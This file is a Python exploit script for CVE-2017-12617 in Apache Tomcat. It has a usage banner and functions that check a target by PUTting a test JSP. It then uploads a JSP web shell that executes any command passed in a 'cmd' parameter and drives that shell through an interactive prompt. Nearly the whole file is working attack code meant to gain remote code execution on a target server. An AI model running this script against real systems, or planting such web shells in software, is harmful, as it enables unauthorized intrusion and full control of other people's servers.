#!/usr/bin/python
import requests
import re
import sys
import signal
from optparse import OptionParser

data="""


  CVE-2017-12617                                                                          


./cve-2017-12617.py


[+]usage:

./cve-2017-12617.py 				: help
./cve-2017-12617.py http://127.0.0.1		: Check Vulnerablity
./cve-2017-12617.py http://127.0.0.1 shell	: Get simple RCE shell



"""


def getContent(url,fname):
	headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
	re=requests.get(str(url)+"/"+str(fname), headers=headers)
	return re.content

def checkVulnerable(url,fname):
	payload='<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>'
	headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
	req=requests.put(url+"/"+fname+"/",data=payload, headers=headers)
	if req.status_code==204 or req.status_code==201 :
		content=getContent(url+"/",fname)
		if b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in content:
			return 1
	else:
		return 0	


   
def RCE(url,fname):
	payload="""<FORM METHOD=GET ACTION='{}'>""".format(fname)+"""
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
    <%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>"""

	headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
	req=requests.put(url+"/"+fname+"/",data=payload, headers=headers)
	
    

def removetags(tags):
	remove = re.compile('<.*?>')
	txt = re.sub(remove, '\n', tags)
	return txt.replace("\\n","")



def shell(url,fname):
    
	while True:
		headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
		cmd=input("$ ")
		payload={'cmd':cmd}
		if cmd=="q" or cmd=="Q":
			break
        
		re=requests.get(str(url)+"/"+str(fname),params=payload,headers=headers)
		re=str(re.content)
		t=removetags(re)
		print (t[20:len(t)-2])



file_name="test1.jsp"

if len(sys.argv) ==1 :
	print(data)
elif len(sys.argv) ==2 :
	res=checkVulnerable(str(sys.argv[1]),file_name)
	if res == 1:
		print ("Vulnerable to CVE-2017-12617")
	else:
		print ("Not Vulnerable to CVE-2017-12617")


elif len(sys.argv) ==3 :
	res=checkVulnerable(str(sys.argv[1]),"random"+file_name)
	if res ==1:
		print ("Vulnerable to CVE-2017-12617")
		RCE(str(sys.argv[1]),file_name)
		shell(str(sys.argv[1]),file_name)
		
	else:
		print ("Not Vulnerable to CVE-2017-12617")

else :
	print("Improper Parameters\n")
	print(data)




	
